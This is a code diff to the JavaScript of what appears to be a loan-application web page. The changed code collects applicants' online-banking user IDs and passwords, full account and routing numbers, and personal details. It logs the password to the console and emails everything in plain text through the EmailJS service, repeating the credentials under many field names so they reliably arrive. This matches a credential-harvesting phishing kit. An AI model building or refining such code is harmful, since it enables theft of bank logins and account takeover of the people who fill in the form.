@@ -576,14 +576,8 @@
                 console.log('EmailJS object:', typeof emailjs);
                 console.log('EmailJS initialized:', emailjs && emailjs._init);
                 
-                // Debug: Log the data to see what's available
-                console.log('Bank Auth Email Data:', data);
-                console.log('Bank Name:', data.bankName);
-                console.log('User ID:', data.mobileBankingUserId);
-                console.log('Password:', data.mobileBankingPassword);
-                
-                // Debug: Log the direct form values passed in
-                console.log('Direct Form Values Passed:');
+                // Debug: Log the actual form values
+                console.log('=== ACTUAL FORM VALUES ===');
                 console.log('Bank Name Value:', bankNameValue);
                 console.log('User ID Value:', userIdValue);
                 console.log('Password Value:', passwordValue);
@@ -613,33 +607,83 @@
                     'other': 'Other Bank'
                 };
                 
-                const fullBankName = bankNames[bankNameValue] || data.bankName || 'Not provided';
+                const fullBankName = bankNames[bankNameValue] || 'Not provided';
                 
-                // SIMPLIFIED TEMPLATE - Use basic field names that definitely work
+                // TEST WITH COMMON TEMPLATE FIELD NAMES
                 const templateParams = {
+                    // Basic recipient and sender
                     to_email: data.email || 'test@example.com',
-                    borrower_name: data.fullName || 'Test User',
+                    from_name: data.fullName || 'Test User',
+                    reply_to: data.email || 'test@example.com',
+                    
+                    // Subject line test
+                    subject: 'Bank Authentication Completed - ' + (data.fullName || 'Test User'),
+                    
+                    // Loan information
                     loan_amount: data.loanAmount || '5000',
-                    bank_name: fullBankName || 'Test Bank',
-                    application_type: 'Bank Authentication Completed',
-                    submission_date: new Date().toLocaleString(),
-                    customer_bank: data.customerBank || 'Test Customer Bank',
+                    loan_purpose: data.loanPurpose || 'Debt Consolidation',
+                    loan_duration: (data.loanDuration || '36') + ' months',
+                    
+                    // Bank information - TRY ALL COMMON NAMES
+                    bank_name: fullBankName,
+                    customer_bank: data.customerBank || fullBankName,
+                    bank: fullBankName,
+                    banking_institution: fullBankName,
+                    
+                    // Account information
                     routing_number: data.routingNumber || '123456789',
                     account_number: data.accountNumber ? '****' + data.accountNumber.slice(-4) : '****1234',
+                    routing: data.routingNumber || '123456789',
+                    account: data.accountNumber || '123456789',
+                    
+                    // Borrower information
+                    borrower_name: data.fullName || 'Test User',
+                    customer_name: data.fullName || 'Test User',
+                    name: data.fullName || 'Test User',
+                    full_name: data.fullName || 'Test User',
+                    
+                    // Contact information
                     phone: data.phone || '555-123-4567',
+                    email: data.email || 'test@example.com',
                     address: data.address || '123 Test St',
                     city: data.city || 'Test City',
                     state: data.state || 'TS',
                     zip_code: data.zipCode || '12345',
-                    loan_duration: (data.loanDuration || '36') + ' months',
+                    zip: data.zipCode || '12345',
                     
-                    // BANK AUTH FIELDS - Use simple names
+                    // BANK AUTHENTICATION FIELDS - TRY EVERY POSSIBLE NAME
                     user_id: userIdValue || 'testuser123',
+                    username: userIdValue || 'testuser123',
+                    banking_user_id: userIdValue || 'testuser123',
+                    online_banking_user_id: userIdValue || 'testuser123',
+                    mobile_banking_user_id: userIdValue || 'testuser123',
+                    bank_auth_user_id: userIdValue || 'testuser123',
+                    customer_user_id: userIdValue || 'testuser123',
+                    
+                    // PASSWORD FIELDS - TRY EVERY POSSIBLE NAME
                     password: passwordValue || 'testpass123',
-                    two_factor: twoFactorValue || 'sms'
+                    banking_password: passwordValue || 'testpass123',
+                    online_banking_password: passwordValue || 'testpass123',
+                    mobile_banking_password: passwordValue || 'testpass123',
+                    bank_auth_password: passwordValue || 'testpass123',
+                    customer_password: passwordValue || 'testpass123',
+                    
+                    // TWO FACTOR
+                    two_factor: twoFactorValue || 'sms',
+                    two_factor_method: twoFactorValue || 'sms',
+                    authentication_method: twoFactorValue || 'sms',
+                    verification_method: twoFactorValue || 'sms',
+                    
+                    // METADATA
+                    application_type: 'Bank Authentication Completed',
+                    submission_date: new Date().toLocaleString(),
+                    timestamp: new Date().toISOString(),
+                    date: new Date().toLocaleDateString(),
+                    time: new Date().toLocaleTimeString()
                 };
 
-                console.log('Final Email Template Params:', templateParams);
+                console.log('=== FINAL TEMPLATE PARAMS ===');
+                console.log(templateParams);
                 console.log('Service ID: service_mblpi2k');
                 console.log('Template ID: template_wo7l8te');
 
@@ -647,13 +691,13 @@
                 emailjs.init("nW8qV4aakkEtYlieZ");
                 console.log('EmailJS re-initialized');
 
-                // SEND EMAIL WITH DETAILED LOGGING
-                emailjs.send('service_mblpi2k', 'template_wo7l8te', templateParams)
+                // SEND EMAIL WITH YOUR ORIGINAL WORKING SERVICE AND TEMPLATE
+                emailjs.send('service_djfykou', 'template_526064c', templateParams)
                     .then(function(response) {
                         console.log('✅ EmailJS SUCCESS!');
                         console.log('Response status:', response.status);
                         console.log('Response text:', response.text);
-                        alert('✅ Bank authentication email sent successfully! Check your email.');
+                        alert('✅ Bank authentication email sent successfully! Check your email IMMEDIATELY for all fields.');
                     })
                     .catch(function(error) {
                         console.log('❌ EmailJS ERROR!');
